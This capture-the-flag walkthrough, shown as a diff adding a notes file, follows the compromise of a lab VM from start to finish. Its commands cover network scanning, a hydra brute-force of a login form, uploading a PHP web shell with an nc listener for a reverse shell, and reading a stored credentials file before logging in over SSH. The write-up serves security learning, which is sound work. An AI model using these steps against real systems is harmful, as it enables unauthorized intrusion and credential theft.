@@ -1,0 +1,114 @@
+$ sudo netdiscover -i wlp2s0
+
+192.168.1.6
+
+
+$ nmap -sV 192.168.1.6 -p- -T5 -Pn
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+there is a web server running on port 80  so go to http://192.168.1.6
+
+it redirects to login.php
+
+go to  http://192.168.1.6/robots.txt
+
+User-agent: *
+Disallow: /
+Disallow: /backup
+Disallow: /admin
+Disallow: /admin_area
+Disallow: /r00t
+Disallow: /uploads
+Disallow: /uploaded_files
+Disallow: /flag
+
+go to /flag
+
+so first flag is right there 
+The 1st flag is : {8734509128730458630012095}
+
+
+
+now go to the login page
+
+there is username adn password fields
+
+I will use hydra to bruteforce this form
+
+https://olinux.net/brute-force-attack-login-form/
+this is a nice article about how to bruteforce login pages with hydra
+
+
+hydra -L /home/cihan/Desktop/user -P /home/cihan/Desktop/Me/SecLists/Passwords/darkweb2017-top10000.txt  192.168.1.9 http-post-form  "/check_login.php:user_name=^USER^&pass_word=^PASS^:Error in username/password" -V
+
+this one didint work , so I decided to dig deeper.
+
+lets start with /admin
+
+nope not a valid url
+
+go to /admin_area
+
+look at the source page
+
+username : admin
+	password : 3v1l_H@ck3r
+	The 2nd flag is : {7412574125871236547895214}
+	
+found username pass and 2. flag
+
+
+lets login , and there is a file upload page
+
+and there is also /uploaded_files directory
+
+we maybe upload a shell and execute it later while browing /uploaded_files
+
+first start a listener on the server
+$ nc -lnvp 4444
+I uploaded a shell.php file and late go to http://192.168.1.6/uploaded_files/shell.php
+
+
+now we got the shell
+
+after a little bit diggin I found the 3. flag in the /var/www/html directory and it
+was in a file called hint.txt
+
+try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)
+
+The 3rd flag is : {7645110034526579012345670}
+
+lets find the file 
+
+$ find / -type f -user technawi
+
+/etc/mysql/conf.d/credentials.txt
+/var/www/html/flag.txt
+/home/technawi/.bash_history
+/home/technawi/.sudo_as_admin_successful
+/home/technawi/.profile
+/home/technawi/.bashrc
+/home/technawi/.bash_logout
+
+$ cat /etc/mysql/conf.d/credentials.txt
+lets read this file
+The 4th flag is : {7845658974123568974185412}
+
+username : technawi
+password : 3vilH@ksor
+
+$ ssh -l technawi 192.168.1.6
+
+
+$ cd /var/www/html
+$ cat flag.txt
+
+The 5th flag is : {5473215946785213456975249}
+
+Good job :)
+
+You find 5 flags and got their points and finish the first scenario....
